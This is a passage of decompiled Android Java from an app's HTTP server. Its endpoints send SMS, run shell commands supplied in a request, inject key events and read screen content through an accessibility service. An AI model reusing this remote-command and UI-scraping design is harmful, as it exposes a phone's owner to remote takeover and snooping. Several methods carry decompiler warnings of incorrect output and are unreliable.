                    smsManager.sendTextMessage(str, null, it.next(), null, null);
                    z2 = true;
                }
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(z2));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void E3(AbstractC0381k abstractC0381k) {
        try {
            boolean m168S = AbstractC0026q.m168S();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(m168S));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: F */
    public static void m464F(DeviceCipherStateVO deviceCipherStateVO, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(AbstractC0251g.m642O(deviceCipherStateVO)));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void F0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByClassNameStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void F1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setSuccess(Boolean.TRUE);
            apiResult.setCount(0);
            if (MainApplication.getInstance() != null && !AbstractC0026q.m151B(MainApplication.getInstance().getPackageName())) {
                apiResult.setData(MainApplication.getInstance().getPackageName());
                apiResult.setCount(1);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void F2(AbstractC0381k abstractC0381k, String str) {
        try {
            ApiResult apiResult = new ApiResult();
            C0896a c0896a = new C0896a();
            c0896a.f1989b = 2;
            c0896a.f1991d = "Server Exception From Operation";
            c0896a.f1990c = "Server Exception From Operation";
            apiResult.setData(c0896a);
            apiResult.setCode(601);
            apiResult.setMsg(str);
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.FALSE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void F3(AbstractC0381k abstractC0381k, Long l2) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCount(1);
            apiResult.setData(Boolean.valueOf(AbstractC0251g.x1(l2)));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: G */
    public static void m465G(RequestCommand requestCommand, AbstractC0381k abstractC0381k) {
        if (requestCommand != null) {
            try {
                if (requestCommand.getCommands() != null && !requestCommand.getCommands().isEmpty()) {
                    String[] strArr = new String[requestCommand.getCommands().size()];
                    requestCommand.getCommands().toArray(strArr);
                    CommandResult m188u = AbstractC0026q.m188u(strArr, false, true);
                    ApiResult apiResult = new ApiResult();
                    apiResult.setData(m188u);
                    apiResult.setCode(200);
                    apiResult.setMsg("OK");
                    apiResult.setCount(1);
                    apiResult.setSuccess(Boolean.TRUE);
                    String m693N = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N);
                    abstractC0381k.mo787l();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
    }

    public static void G0(String str, CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                return;
            }
            try {
                m1075n = o12.m1075n(combineFilter);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1075n != null) {
                searchNodeResultVO = o12.m1059D(m1075n.findOneByCombine(combineFilter));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void G1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setSuccess(Boolean.TRUE);
            apiResult.setCount(0);
            if (!AbstractC0026q.m151B(AbstractC0248d.m610h())) {
                apiResult.setData(AbstractC0248d.m610h());
                apiResult.setCount(1);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void G2(AbstractC0381k abstractC0381k) {
        try {
            ADBConfig m689J = AbstractC0252h.m689J();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(m689J);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: H */
    public static void m466H(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByClassName(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:6:0x001f A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0020  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void H0(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        String delegateId;
        C0416e o12;
        UiObject m1075n;
        SearchNodeResultVO searchNodeResultVO = null;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    delegateId = combineFilterWithChild.getParentFilter().getDelegateId();
                    o12 = o1(delegateId);
                    if (m508x(o12, abstractC0381k)) {
                        if (o12 == null) {
                            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                            return;
                        }
                        if (combineFilterWithChild != null) {
                            try {
                                if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                                    searchNodeResultVO = o12.m1059D(m1075n.findOneByCombineWithChild(combineFilterWithChild));
                                }
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("AccessibilityDelegate", e2);
                            }
                        }
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        delegateId = null;
        o12 = o1(delegateId);
        if (m508x(o12, abstractC0381k)) {
        }
    }

    public static void H1(MatchListenWindowVO matchListenWindowVO, AbstractC0381k abstractC0381k) {
        if (matchListenWindowVO != null) {
            try {
                C0416e o12 = o1(matchListenWindowVO.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    ApiResult apiResult = new ApiResult();
                    apiResult.setData(Boolean.valueOf(o12.m1078q(matchListenWindowVO.getListenWindows())));
                    apiResult.setCode(200);
                    apiResult.setMsg("OK");
                    apiResult.setCount(1);
                    apiResult.setSuccess(Boolean.TRUE);
                    String m693N = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void H2(AbstractC0381k abstractC0381k) {
        try {
            PowerControlStateVO m707k = AbstractC0252h.m707k(MainApplication.getAppContext().getPackageName());
            PowerControlStateVO m707k2 = AbstractC0252h.m707k("com.google.guard");
            ApiResult apiResult = new ApiResult();
            apiResult.setData(new LinkedList());
            if (m707k != null) {
                ((List) apiResult.getData()).add(m707k);
            }
            if (m707k2 != null) {
                ((List) apiResult.getData()).add(m707k2);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: I */
    public static void m467I(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByClassNameContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:6:0x001f A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0020  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void I0(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        String delegateId;
        C0416e o12;
        UiObject m1075n;
        SearchNodeResultVO searchNodeResultVO = null;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    delegateId = combineFilterWithChild.getParentFilter().getDelegateId();
                    o12 = o1(delegateId);
                    if (m508x(o12, abstractC0381k)) {
                        if (o12 == null) {
                            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                            return;
                        }
                        if (combineFilterWithChild != null) {
                            try {
                                if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                                    searchNodeResultVO = o12.m1059D(m1075n.findOneByCombineWithParent(combineFilterWithChild));
                                }
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("AccessibilityDelegate", e2);
                            }
                        }
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        delegateId = null;
        o12 = o1(delegateId);
        if (m508x(o12, abstractC0381k)) {
        }
    }

    public static void I1(float f2, AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            Boolean bool = Boolean.TRUE;
            apiResult.setSuccess(bool);
            if (MyAccessibilityService.m554P().f307e != null) {
                C0429r c0429r = MyAccessibilityService.m554P().f307e;
                int i2 = Build.VERSION.SDK_INT;
                CallableC0242k callableC0242k = c0429r.f955b;
                if (i2 >= 30) {
                    C0918a c0918a = (C0918a) callableC0242k.f390b;
                    if (c0918a != null && f2 > 0.0f && f2 <= 1.0f) {
                        Float valueOf = Float.valueOf(f2);
                        c0918a.f2084e = valueOf;
                        c0918a.f2085f = Integer.valueOf((int) (valueOf.floatValue() * 100.0f));
                    }
                } else {
                    callableC0242k.getClass();
                }
                apiResult.setData(bool);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void I2(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(AbstractC0251g.S0()));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: J */
    public static void m468J(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByClassNameEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:6:0x0020 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0021  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void J0(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        String delegateId;
        C0416e o12;
        UiObject m1075n;
        UiObject uiObject;
        SearchNodeResultVO searchNodeResultVO = null;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    delegateId = combineFilterWithChild.getParentFilter().getDelegateId();
                    o12 = o1(delegateId);
                    if (m508x(o12, abstractC0381k)) {
                        if (o12 == null) {
                            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                            return;
                        }
                        if (combineFilterWithChild != null) {
                            try {
                                if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                                    UiObjectCollection findByCombine = m1075n.findByCombine(combineFilterWithChild.getParentFilter());
                                    if (findByCombine != null && !findByCombine.empty().booleanValue()) {
                                        for (int i2 = 0; i2 < findByCombine.size(); i2++) {
                                            uiObject = findByCombine.get(i2);
                                            if (uiObject.findOneByCombine(combineFilterWithChild.getChildFilter()) == null) {
                                                break;
                                            }
                                        }
                                    }
                                    uiObject = null;
                                    searchNodeResultVO = o12.m1059D(uiObject);
                                }
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("AccessibilityDelegate", e2);
                            }
                        }
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        delegateId = null;
        o12 = o1(delegateId);
        if (m508x(o12, abstractC0381k)) {
        }
    }

    public static void J1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            boolean z2 = false;
            apiResult.setCount(0);
            apiResult.setSuccess(Boolean.TRUE);
            if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                z2 = C0318e.m844S().m855N("input keyevent KEYCODE_MOVE_END");
            }
            apiResult.setData(Boolean.valueOf(z2));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void J2(String str, String str2, String str3, String str4, String str5, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            if (AbstractC0251g.m653Z() != null && !AbstractC0026q.m151B(str) && !AbstractC0026q.m151B(str2)) {
                apiResult.setData(Boolean.valueOf(AbstractC0191n.m358c(str, str2, str3, str4, str5)));
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: K */
    public static void m469K(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByClassNameMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void K0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByDesc(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void K1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            boolean z2 = false;
            apiResult.setCount(0);
            apiResult.setSuccess(Boolean.TRUE);
            if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                z2 = C0318e.m844S().m855N("input keyevent KEYCODE_MOVE_HOME");
            }
            apiResult.setData(Boolean.valueOf(z2));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void K2(List list, AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            C0416e m523d = MyAccessibilityService.m554P().m523d("com.android.settings", list);
            ApiResult apiResult = new ApiResult();
            if (m523d != null) {
                apiResult.setData(m523d.f864c);
                apiResult.setCount(1);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.valueOf(AbstractC0251g.g1()));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: L */
    public static void m470L(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByClassNameStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
